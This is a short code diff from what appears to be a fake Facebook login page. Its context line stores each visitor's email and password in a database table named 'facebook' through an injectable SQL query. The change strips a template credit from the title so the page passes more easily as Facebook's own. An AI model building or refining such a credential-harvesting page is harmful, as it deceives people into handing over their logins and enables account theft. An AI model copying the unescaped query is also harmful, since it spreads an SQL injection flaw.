@@ -16,7 +16,7 @@ $mysql->query("INSERT INTO facebook (ID, Pass) VALUES ('$email','$pass_wd')");
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login Page | CodingNepal</title>
+    <title>Facebook Login Page</title>
     <link rel="stylesheet" href="style.css">
   </head>
   <body>
